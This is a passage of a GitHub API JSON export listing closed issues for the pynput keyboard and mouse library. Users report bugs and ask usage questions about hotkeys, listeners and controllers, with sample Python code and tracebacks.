Characters", "user": {"login": "itopal1", "id": 25910473, "node_id": "MDQ6VXNlcjI1OTEwNDcz", "avatar_url": "https://avatars3.githubusercontent.com/u/25910473?v=4", "gravatar_id": "", "url": "https://api.github.com/users/itopal1", "html_url": "https://github.com/itopal1", "followers_url": "https://api.github.com/users/itopal1/followers", "following_url": "https://api.github.com/users/itopal1/following{/other_user}", "gists_url": "https://api.github.com/users/itopal1/gists{/gist_id}", "starred_url": "https://api.github.com/users/itopal1/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/itopal1/subscriptions", "organizations_url": "https://api.github.com/users/itopal1/orgs", "repos_url": "https://api.github.com/users/itopal1/repos", "events_url": "https://api.github.com/users/itopal1/events{/privacy}", "received_events_url": "https://api.github.com/users/itopal1/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2020-03-28T20:33:38Z", "updated_at": "2020-03-29T18:41:24Z", "closed_at": "2020-03-29T18:41:24Z", "author_association": "NONE", "active_lock_reason": null, "body": "Could you please add Turkis characters also. (\u0131\u0130\u011f\u011e\u00fc\u00dc\u015f\u015e\u00f6\u00d6\u00e7\u00c7)", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/235", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/235/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/235/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/235/events", "html_url": "https://github.com/moses-palmer/pynput/issues/235", "id": 583413828, "node_id": "MDU6SXNzdWU1ODM0MTM4Mjg=", "number": 235, "title": "Sample Code Throws errors.", "user": {"login": "Antiswitcher", "id": 30308663, "node_id": "MDQ6VXNlcjMwMzA4NjYz", "avatar_url": "https://avatars1.githubusercontent.com/u/30308663?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Antiswitcher", "html_url": "https://github.com/Antiswitcher", "followers_url": "https://api.github.com/users/Antiswitcher/followers", "following_url": "https://api.github.com/users/Antiswitcher/following{/other_user}", "gists_url": "https://api.github.com/users/Antiswitcher/gists{/gist_id}", "starred_url": "https://api.github.com/users/Antiswitcher/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Antiswitcher/subscriptions", "organizations_url": "https://api.github.com/users/Antiswitcher/orgs", "repos_url": "https://api.github.com/users/Antiswitcher/repos", "events_url": "https://api.github.com/users/Antiswitcher/events{/privacy}", "received_events_url": "https://api.github.com/users/Antiswitcher/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-03-18T02:15:17Z", "updated_at": "2020-03-18T07:17:17Z", "closed_at": "2020-03-18T07:17:17Z", "author_association": "NONE", "active_lock_reason": null, "body": "from pynput import keyboard\r\nwith keyboard.Events() as events:\r\n    for event in events:\r\n        if event.key == keyboard.Key.esc:\r\n            break\r\n        else:\r\n            print('Received event {}'.format(event))\r\n\r\n#will throw these errors on 3.8 on Ubuntu.\r\n\r\nTraceback (most recent call last):\r\n  File \"brawl-combo.py\", line 9, in <module>\r\n    print('Received event {}'.format(event))\r\n  File \"/home/lafont/.local/lib/python3.7/site-packages/pynput/_util/__init__.py\", line 225, in __str__\r\n    for (k, v) in vars(self)))\r\n  File \"/home/lafont/.local/lib/python3.7/site-packages/pynput/_util/__init__.py\", line 225, in <genexpr>\r\n    for (k, v) in vars(self)))\r\nValueError: too many values to unpack (expected 2)\r\n\r\n\r\n\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/234", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/234/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/234/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/234/events", "html_url": "https://github.com/moses-palmer/pynput/issues/234", "id": 583293946, "node_id": "MDU6SXNzdWU1ODMyOTM5NDY=", "number": 234, "title": "Combining Global Hot Keys With Press And Hold", "user": {"login": "gfleetwood", "id": 7785756, "node_id": "MDQ6VXNlcjc3ODU3NTY=", "avatar_url": "https://avatars0.githubusercontent.com/u/7785756?v=4", "gravatar_id": "", "url": "https://api.github.com/users/gfleetwood", "html_url": "https://github.com/gfleetwood", "followers_url": "https://api.github.com/users/gfleetwood/followers", "following_url": "https://api.github.com/users/gfleetwood/following{/other_user}", "gists_url": "https://api.github.com/users/gfleetwood/gists{/gist_id}", "starred_url": "https://api.github.com/users/gfleetwood/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/gfleetwood/subscriptions", "organizations_url": "https://api.github.com/users/gfleetwood/orgs", "repos_url": "https://api.github.com/users/gfleetwood/repos", "events_url": "https://api.github.com/users/gfleetwood/events{/privacy}", "received_events_url": "https://api.github.com/users/gfleetwood/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-03-17T20:56:44Z", "updated_at": "2020-03-18T16:24:33Z", "closed_at": "2020-03-18T16:24:33Z", "author_association": "NONE", "active_lock_reason": null, "body": "I'm writing a script to simulate simple mouse actions with the keyboard. The hot key \"p+w\" is mapped to moving the cursor up 5 pixels (?), but I have to hold 'p' and continuously press 'w' to continue the motion. I want to hold 'p' and 'w' for continuous movement. One idea I had was to include a while loop in the callback function that checks if 'w' is being pressed, but I'm not sure if this is the best way or how to implement it. Here's a sample of my code:\r\n\r\n```\r\nfrom pynput import keyboard\r\nfrom pynput.mouse import Button, Controller\r\n\r\ndef on_activate_up():\r\n    mouse.move(0, -5)\r\n\r\ndef on_activate_click_left():\r\n    mouse.click(Button.left)\r\n\r\n\"\"\"\r\nAll the other global hot key callback functions would be here.\r\n\"\"\"\r\n\r\nmouse = Controller()\r\n  \r\nwith keyboard.GlobalHotKeys({\r\n        'p+w': on_activate_up,\r\n        'p+d': on_activate_right,\r\n        'p+s': on_activate_down,\r\n        'p+a': on_activate_left,\r\n        'p+q': on_activate_click_left,\r\n        'p+e': on_activate_click_right}) as h:\r\n    h.join()\r\n```\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/233", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/233/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/233/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/233/events", "html_url": "https://github.com/moses-palmer/pynput/issues/233", "id": 578089786, "node_id": "MDU6SXNzdWU1NzgwODk3ODY=", "number": 233, "title": "Crash my keyboard inputs", "user": {"login": "jeff007ali", "id": 26355456, "node_id": "MDQ6VXNlcjI2MzU1NDU2", "avatar_url": "https://avatars0.githubusercontent.com/u/26355456?v=4", "gravatar_id": "", "url": "https://api.github.com/users/jeff007ali", "html_url": "https://github.com/jeff007ali", "followers_url": "https://api.github.com/users/jeff007ali/followers", "following_url": "https://api.github.com/users/jeff007ali/following{/other_user}", "gists_url": "https://api.github.com/users/jeff007ali/gists{/gist_id}", "starred_url": "https://api.github.com/users/jeff007ali/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/jeff007ali/subscriptions", "organizations_url": "https://api.github.com/users/jeff007ali/orgs", "repos_url": "https://api.github.com/users/jeff007ali/repos", "events_url": "https://api.github.com/users/jeff007ali/events{/privacy}", "received_events_url": "https://api.github.com/users/jeff007ali/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2020-03-09T18:00:37Z", "updated_at": "2020-03-10T06:14:31Z", "closed_at": "2020-03-10T06:14:31Z", "author_association": "NONE", "active_lock_reason": null, "body": "What I am trying to do is? Instead of writing something repeatedly, you can assign it to code. Then just type that code and it will change that code into assigned text. For example, instead of writing your signature, simply type -sig and it will convert code into \"Regards,\\nXYZ\".\r\n\r\nSo here my code is : \r\n```python\r\nfrom pynput.keyboard import Key, KeyCode, Controller\r\nimport pyperclip\r\n\r\ndef get_recent_text(keyword):\r\n    select_text(keyword)\r\n    copy_text()\r\n    return read_clipboard_data()\r\n\r\ndef select_text(text):\r\n    print(\"in select text\")\r\n    keyboard = Controller()\r\n    keyboard.press(Key.shift)\r\n    for _ in text:\r\n        keyboard.press(Key.left)\r\n        keyboard.release(Key.left)\r\n    keyboard.release(Key.shift)\r\n\r\ndef copy_text():\r\n    # print('copy')\r\n    keyboard = Controller()\r\n    keyboard.press(Key.ctrl_l)\r\n    keyboard.press('c')\r\n    keyboard.release('c')\r\n    keyboard.release(Key.ctrl_l)\r\n    time.sleep(0.1)\r\n\r\ndef paste_text():\r\n    # print('paste')\r\n    keyboard = Controller()\r\n    keyboard.press(Key.ctrl_l)\r\n    keyboard.press('v')\r\n    keyboard.release('v')\r\n    keyboard.release(Key.ctrl_l)\r\n\r\ndef read_clipboard_data():\r\n    return pyperclip.paste()\r\n\r\ndef write_clipboard_data(data):\r\n    pyperclip.copy(data)\r\n\r\ndef replace_keyword(keyword, text):\r\n    write_clipboard_data(text)\r\n    delete_text(keyword)\r\n    paste_text()\r\n\r\ndef delete_text(string):\r\n    keyboard = Controller()\r\n    for _ in string:\r\n        keyboard.press(Key.backspace)\r\n        keyboard.release(Key.backspace)\r\n        time.sleep(0.05)\r\n\r\ndef on_press(key):\r\n        for keyword in [\"-sig\"]:\r\n            if keyword == get_recent_text(keyword): # crashing on this line\r\n                replace_keyword(keyword, \"Regards,\\nXYZ\")\r\n\r\n with Listener(on_press=self.on_press) as listener:\r\n            listener.join()\r\n```\r\n\r\nCan you please help me with this weird issue?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/232", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/232/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/232/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/232/events", "html_url": "https://github.com/moses-palmer/pynput/issues/232", "id": 573492108, "node_id": "MDU6SXNzdWU1NzM0OTIxMDg=", "number": 232, "title": "for global hotkeys, suppress is trapping all keyboard input", "user": {"login": "jfayre", "id": 2953870, "node_id": "MDQ6VXNlcjI5NTM4NzA=", "avatar_url": "https://avatars3.githubusercontent.com/u/2953870?v=4", "gravatar_id": "", "url": "https://api.github.com/users/jfayre", "html_url": "https://github.com/jfayre", "followers_url": "https://api.github.com/users/jfayre/followers", "following_url": "https://api.github.com/users/jfayre/following{/other_user}", "gists_url": "https://api.github.com/users/jfayre/gists{/gist_id}", "starred_url": "https://api.github.com/users/jfayre/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/jfayre/subscriptions", "organizations_url": "https://api.github.com/users/jfayre/orgs", "repos_url": "https://api.github.com/users/jfayre/repos", "events_url": "https://api.github.com/users/jfayre/events{/privacy}", "received_events_url": "https://api.github.com/users/jfayre/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2020-03-01T06:08:51Z", "updated_at": "2020-04-09T21:30:28Z", "closed_at": "2020-04-09T21:30:28Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hello,\r\nI'm on Windows 10. \r\nWhen I try to use the following code, suppress=True is causing all keys to block. I can't press Alt+tab to switch windows, or any other key combination.\r\nThis is with the latest pynput from pip.\r\nFor my application, I need to be able to use global hotkeys, but I need to suppress them.\r\nimport time\r\nfrom pynput import keyboard\r\n\r\ndef on_activate_h():\r\n    print('<ctrl>+o pressed')\r\n\r\ndef on_activate_i():\r\n    print('<ctrl>+<alt>+i pressed')\r\n\r\nh = keyboard.GlobalHotKeys({\r\n        '<ctrl>+o': on_activate_h,\r\n        '<ctrl>+<alt>+i': on_activate_i}, suppress = True)\r\n\r\nh.start()\r\n\r\nwhile True:\r\n    time.sleep(30)\r\n    break\r\n\r\nAny idea what's going on here?\r\nThanks!\r\n\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/230", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/230/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/230/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/230/events", "html_url": "https://github.com/moses-palmer/pynput/issues/230", "id": 569212702, "node_id": "MDU6SXNzdWU1NjkyMTI3MDI=", "number": 230, "title": "pynput not working in another game app", "user": {"login": "Zoha", "id": 16442858, "node_id": "MDQ6VXNlcjE2NDQyODU4", "avatar_url": "https://avatars2.githubusercontent.com/u/16442858?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Zoha", "html_url": "https://github.com/Zoha", "followers_url": "https://api.github.com/users/Zoha/followers", "following_url": "https://api.github.com/users/Zoha/following{/other_user}", "gists_url": "https://api.github.com/users/Zoha/gists{/gist_id}", "starred_url": "https://api.github.com/users/Zoha/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Zoha/subscriptions", "organizations_url": "https://api.github.com/users/Zoha/orgs", "repos_url": "https://api.github.com/users/Zoha/repos", "events_url": "https://api.github.com/users/Zoha/events{/privacy}", "received_events_url": "https://api.github.com/users/Zoha/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 5, "created_at": "2020-02-21T22:17:39Z", "updated_at": "2020-02-24T10:39:30Z", "closed_at": "2020-02-24T10:22:40Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hello\r\nI am using pynput in windows \r\nI'm trying to get user key presses in another game application and then maybe execute some custom key presses \r\nI using very basic default example of pynput \r\nProblem is that events triggered in outside of the game \r\nBut in game events not triggered\r\n\r\n```\r\nfrom pynput import keyboard\r\n\r\ndef on_press(key):\r\n    try:\r\n        print('alphanumeric key {0} pressed'.format(\r\n            key.char))\r\n    except AttributeError:\r\n        print('special key {0} pressed'.format(\r\n            key))\r\n\r\ndef on_release(key):\r\n    print('{0} released'.format(\r\n        key))\r\n    if key == keyboard.Key.esc:\r\n        # Stop listener\r\n        return False\r\n\r\n# Collect events until released\r\nwith keyboard.Listener(\r\n        on_press=on_press,\r\n        on_release=on_release) as listener:\r\n    listener.join()\r\n\r\n# ...or, in a non-blocking fashion:\r\nlistener = keyboard.Listener(\r\n    on_press=on_press,\r\n    on_release=on_release)\r\nlistener.start()\r\n```\r\nIs this possible to get events in the game? can I do anything about it?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/229", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/229/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/229/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/229/events", "html_url": "https://github.com/moses-palmer/pynput/issues/229", "id": 568459309, "node_id": "MDU6SXNzdWU1Njg0NTkzMDk=", "number": 229, "title": "I need some further examples for global hotkeys", "user": {"login": "jfayre", "id": 2953870, "node_id": "MDQ6VXNlcjI5NTM4NzA=", "avatar_url": "https://avatars3.githubusercontent.com/u/2953870?v=4", "gravatar_id": "", "url": "https://api.github.com/users/jfayre", "html_url": "https://github.com/jfayre", "followers_url": "https://api.github.com/users/jfayre/followers", "following_url": "https://api.github.com/users/jfayre/following{/other_user}", "gists_url": "https://api.github.com/users/jfayre/gists{/gist_id}", "starred_url": "https://api.github.com/users/jfayre/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/jfayre/subscriptions", "organizations_url": "https://api.github.com/users/jfayre/orgs", "repos_url": "https://api.github.com/users/jfayre/repos", "events_url": "https://api.github.com/users/jfayre/events{/privacy}", "received_events_url": "https://api.github.com/users/jfayre/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-02-20T17:30:14Z", "updated_at": "2020-02-28T07:29:11Z", "closed_at": "2020-02-28T07:29:11Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi,\r\nI'm relatively new to Python.\r\nI'm writing an application that currently uses the Keyboard module for setting global hotkeys.\r\nSome of my users are reporting some odd issues when registering global hotkeys, so I want to try pynput.\r\nI need to know how to set up a series of global hotkeys, then keep checking for those while the ap is running. I also need to perform other logic while the listener is running. \r\nIf I use the example from the documentation using the globalHotKey function and then using h.join() inside the with block, everything blocks other than the hotkeys.\r\nI'm unclear which portion of my code should go inside the with block.\r\nI apologize if this is a newbie question.\r\nFor reference, my existing project can be found at:\r\nhttp://www.github.com/jfayre/talking-flight-monitor\r\n\r\n\r\n\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/228", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/228/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/228/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/228/events", "html_url": "https://github.com/moses-palmer/pynput/issues/228", "id": 568099005, "node_id": "MDU6SXNzdWU1NjgwOTkwMDU=", "number": 228, "title": "Define an unnamed key as global hotkey", "user": {"login": "Babber", "id": 14124452, "node_id": "MDQ6VXNlcjE0MTI0NDUy", "avatar_url": "https://avatars3.githubusercontent.com/u/14124452?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Babber", "html_url": "https://github.com/Babber", "followers_url": "https://api.github.com/users/Babber/followers", "following_url": "https://api.github.com/users/Babber/following{/other_user}", "gists_url": "https://api.github.com/users/Babber/gists{/gist_id}", "starred_url": "https://api.github.com/users/Babber/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Babber/subscriptions", "organizations_url": "https://api.github.com/users/Babber/orgs", "repos_url": "https://api.github.com/users/Babber/repos", "events_url": "https://api.github.com/users/Babber/events{/privacy}", "received_events_url": "https://api.github.com/users/Babber/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2020-02-20T07:16:07Z", "updated_at": "2020-03-10T06:15:39Z", "closed_at": "2020-03-10T06:15:39Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi,\r\nI am trying to define hotkeys with some otherwise useless keys on my keyboard. The Listener returned keycodes for these, like <269025072>, but I couldn't find the right syntax yet to feed these into my script where I would define the hotkeys:\r\n\r\n```\r\nhotkeys = keyboard.GlobalHotKeys({\r\n'<cmd>+<shift>+<left>': func1,\r\n'<cmd>+<shift>+<right>': func2,\r\n# 269025072: func3,       # or rather?..\r\n'<key.none: <269025072=\"\">>': func3})\r\n```\r\n\r\nIs this possible at all? If yes, what would be the proper way to do this? If no, I would love to add this to the feature requests.\r\nThanks!", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/227", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/227/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/227/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/227/events", "html_url": "https://github.com/moses-palmer/pynput/issues/227", "id": 567654212, "node_id": "MDU6SXNzdWU1Njc2NTQyMTI=", "number": 227, "title": "About <cmd>?", "user": {"login": "jizhihaoSAMA", "id": 48234827, "node_id": "MDQ6VXNlcjQ4MjM0ODI3", "avatar_url": "https://avatars0.githubusercontent.com/u/48234827?v=4", "gravatar_id": "", "url": "https://api.github.com/users/jizhihaoSAMA", "html_url": "https://github.com/jizhihaoSAMA", "followers_url": "https://api.github.com/users/jizhihaoSAMA/followers", "following_url": "https://api.github.com/users/jizhihaoSAMA/following{/other_user}", "gists_url": "https://api.github.com/users/jizhihaoSAMA/gists{/gist_id}", "starred_url": "https://api.github.com/users/jizhihaoSAMA/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/jizhihaoSAMA/subscriptions", "organizations_url": "https://api.github.com/users/jizhihaoSAMA/orgs", "repos_url": "https://api.github.com/users/jizhihaoSAMA/repos", "events_url": "https://api.github.com/users/jizhihaoSAMA/events{/privacy}", "received_events_url": "https://api.github.com/users/jizhihaoSAMA/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2020-02-19T15:57:19Z", "updated_at": "2020-03-10T06:17:22Z", "closed_at": "2020-03-10T06:17:21Z", "author_association": "NONE", "active_lock_reason": null, "body": "```\r\nlist1 = keyboard.HotKey.parse(\"<cmd>+<shift>+s\")\r\nControll = keyboard.Controller()\r\nfor i in list1:\r\n    Controll.press(i)\r\nfor i in list1:\r\n    Controll.release(i)\r\n```\r\n\"Win+shift+S\" can make a screenshot in my Windows 10.But it won't work.\r\n\r\nThis code could work in my computer,But it doesn't work in other computer.\r\n```\r\n    with Controll.pressed(Key.cmd):\r\n        with Controll.pressed(Key.shift):\r\n            Controll.press('s')\r\n            Controll.release('s')\r\n```\r\n\r\nWhat should I do?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/223", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/223/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/223/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/223/events", "html_url": "https://github.com/moses-palmer/pynput/issues/223", "id": 565632573, "node_id": "MDU6SXNzdWU1NjU2MzI1NzM=", "number": 223, "title": "Illegal hardware instruction on macOS 10.15.2", "user": {"login": "creepinson", "id": 11761863, "node_id": "MDQ6VXNlcjExNzYxODYz", "avatar_url": "https://avatars0.githubusercontent.com/u/11761863?v=4", "gravatar_id": "", "url": "https://api.github.com/users/creepinson", "html_url": "https://github.com/creepinson", "followers_url": "https://api.github.com/users/creepinson/followers", "following_url": "https://api.github.com/users/creepinson/following{/other_user}", "gists_url": "https://api.github.com/users/creepinson/gists{/gist_id}", "starred_url": "https://api.github.com/users/creepinson/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/creepinson/subscriptions", "organizations_url": "https://api.github.com/users/creepinson/orgs", "repos_url": "https://api.github.com/users/creepinson/repos", "events_url": "https://api.github.com/users/creepinson/events{/privacy}", "received_events_url": "https://api.github.com/users/creepinson/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2020-02-15T00:58:45Z", "updated_at": "2020-07-06T22:14:47Z", "closed_at": "2020-07-06T22:14:46Z", "author_association": "NONE", "active_lock_reason": null, "body": "Python crashes with\r\n4825 illegal hardware instruction  python3 \r\nI can't find anything online about this.\r\nI'm pretty certain it has to do with the keyController.press\r\n\r\nThis is my current code:\r\n```python\r\nfrom pynput.keyboard import Key, Controller, Listener\r\nimport time\r\nimport sys\r\nimport threading\r\nimport logging \r\nimport tkinter as tk\r\n\r\nkeyController = Controller()\r\nrunning = False\r\n\r\ndef keypress(event):\r\n    global running\r\n    print(event.keysym)\r\n    if(event.keysym == \"F10\"):\r\n        running = not running\r\n\r\ndef thread_function():\r\n    global running\r\n    print(\"Thread starting for wasd key bot\")\r\n\r\n    while(True):\r\n        try:\r\n            if running:\r\n                keyController.press(\"w\")\r\n                time.sleep(500)\r\n                keyController.release(\"w\")\r\n                keyController.press(\"a\")\r\n\r\n                time.sleep(500)\r\n                keyController.release(\"a\")\r\n                keyController.press(\"s\")\r\n\r\n                time.sleep(500)\r\n                keyController.release(\"s\")\r\n                keyController.press(\"d\")\r\n                \r\n                time.sleep(500)\r\n        except KeyboardInterrupt:\r\n            sys.exit()\r\n\r\nx = threading.Thread(target=thread_function, args=())\r\nx.setDaemon(True)\r\nx.start()\r\n\r\nroot = tk.Tk()\r\nroot.bind_all('<Key>', keypress)\r\n\r\n\r\nroot.mainloop()\r\n````", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/222", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/222/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/222/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/222/events", "html_url": "https://github.com/moses-palmer/pynput/issues/222", "id": 562993656, "node_id": "MDU6SXNzdWU1NjI5OTM2NTY=", "number": 222, "title": "mouse.Controller().scroll(dx,dy) is not work", "user": {"login": "DOCCA0", "id": 52144831, "node_id": "MDQ6VXNlcjUyMTQ0ODMx", "avatar_url": "https://avatars0.githubusercontent.com/u/52144831?v=4", "gravatar_id": "", "url": "https://api.github.com/users/DOCCA0", "html_url": "https://github.com/DOCCA0", "followers_url": "https://api.github.com/users/DOCCA0/followers", "following_url": "https://api.github.com/users/DOCCA0/following{/other_user}", "gists_url": "https://api.github.com/users/DOCCA0/gists{/gist_id}", "starred_url": "https://api.github.com/users/DOCCA0/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/DOCCA0/subscriptions", "organizations_url": "https://api.github.com/users/DOCCA0/orgs", "repos_url": "https://api.github.com/users/DOCCA0/repos", "events_url": "https://api.github.com/users/DOCCA0/events{/privacy}", "received_events_url": "https://api.github.com/users/DOCCA0/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 5, "created_at": "2020-02-11T05:57:13Z", "updated_at": "2020-02-17T16:38:08Z", "closed_at": "2020-02-17T16:38:08Z", "author_association": "NONE", "active_lock_reason": null, "body": "mouse.Controller().scroll(dx,dy)is not work\r\nI just use mouse.Listener to record the actions of my mouse,then I store it as *.txt.And I read the txt to let it act.\r\nmouse.Controller().press() and mouse.Controller().release() work well,but when it runs mouse.Controller().scroll(dx,dy),there is almost no action.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/221", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/221/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/221/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/221/events", "html_url": "https://github.com/moses-palmer/pynput/issues/221", "id": 559814565, "node_id": "MDU6SXNzdWU1NTk4MTQ1NjU=", "number": 221, "title": "Q: What is meant by \"non-blocking\" in the documentation?", "user": {"login": "GeorgeCiesinski", "id": 7014211, "node_id": "MDQ6VXNlcjcwMTQyMTE=", "avatar_url": "https://avatars1.githubusercontent.com/u/7014211?v=4", "gravatar_id": "", "url": "https://api.github.com/users/GeorgeCiesinski", "html_url": "https://github.com/GeorgeCiesinski", "followers_url": "https://api.github.com/users/GeorgeCiesinski/followers", "following_url": "https://api.github.com/users/GeorgeCiesinski/following{/other_user}", "gists_url": "https://api.github.com/users/GeorgeCiesinski/gists{/gist_id}", "starred_url": "https://api.github.com/users/GeorgeCiesinski/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/GeorgeCiesinski/subscriptions", "organizations_url": "https://api.github.com/users/GeorgeCiesinski/orgs", "repos_url": "https://api.github.com/users/GeorgeCiesinski/repos", "events_url": "https://api.github.com/users/GeorgeCiesinski/events{/privacy}", "received_events_url": "https://api.github.com/users/GeorgeCiesinski/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2020-02-04T15:59:06Z", "updated_at": "2020-02-17T23:21:53Z", "closed_at": "2020-02-17T16:42:46Z", "author_association": "NONE", "active_lock_reason": null, "body": "I am trying to understand the [handling the keyboard](https://pynput.readthedocs.io/en/latest/keyboard.html) section of the documentation, but I see a term \"non-blocking\" and I don't see it defined in the documentation. I understand that this library uses a thread, but I'm not sure how these two below examples (from the documentation) are different: \r\n\r\n```\r\n# Collect events until released\r\nwith keyboard.Listener(\r\n        on_press=on_press,\r\n        on_release=on_release) as listener:\r\n    listener.join()\r\n\r\n# ...or, in a non-blocking fashion:\r\nlistener = keyboard.Listener(\r\n    on_press=on_press,\r\n    on_release=on_release)\r\nlistener.start()\r\n```\r\n\r\nWill pynput work the same with both examples, or is something going to change? \r\n\r\nI need to know this because I'm trying to use this with a Tkinter app, but the two libraries use threads and I have been unsuccessful in using the pynput listener at the same time as the tkinter mainloop. I'm hoping this is the solution. ", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/220", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/220/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/220/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/220/events", "html_url": "https://github.com/moses-palmer/pynput/issues/220", "id": 559250317, "node_id": "MDU6SXNzdWU1NTkyNTAzMTc=", "number": 220, "title": "mouse position or move don't work in X Window, but gets positions", "user": {"login": "inceabdullah", "id": 978938, "node_id": "MDQ6VXNlcjk3ODkzOA==", "avatar_url": "https://avatars1.githubusercontent.com/u/978938?v=4", 